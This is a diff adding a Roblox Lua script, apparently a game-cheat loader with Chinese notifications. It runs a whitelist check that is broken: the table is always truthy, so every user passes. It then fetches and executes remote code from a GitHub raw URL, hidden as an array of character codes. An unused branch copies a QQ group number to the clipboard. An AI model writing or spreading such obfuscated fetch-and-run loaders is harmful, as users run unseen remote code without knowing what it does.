@@ -1,0 +1,111 @@
+local CoreGui = game:GetService("StarterGui")
+
+CoreGui:SetCore("SendNotification", {
+    Title = "正在检查",
+    Text = "脚本加载请耐心等待...",
+    Duration = 5,
+})
+
+wait(3)
+
+long = game.Players.LocalPlayer.Name
+long = {
+    "Ehhsbsuj",
+    "kiun114514x",
+    "zdzdzfgy",
+    "jgb_096",
+    "iwqqqqqqqqqs",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "sansmcNB",
+    "ygshwishxjso",
+    "jsshhsbsjdhbsjaka",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+}
+if long then
+   local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "检测结果",
+    Text = "检测到您("..game.Players.LocalPlayer.Name..")已经被加入白名单",
+    Duration = 5,
+})
+    loadstring(Game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,109,115,109,100,109,115,109,115,107,47,82,111,98,108,111,120,47,109,97,105,110,47,37,69,54,37,66,56,37,56,53,37,69,57,37,65,51,37,56,69,46,116,120,116})end)())))()
+
+    else 
+  setclipboard("958969064")
+      local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "检测结果",
+    Text = "已自动复制QQ群群号，请加入",
+    Duration = 5,
+})
+end
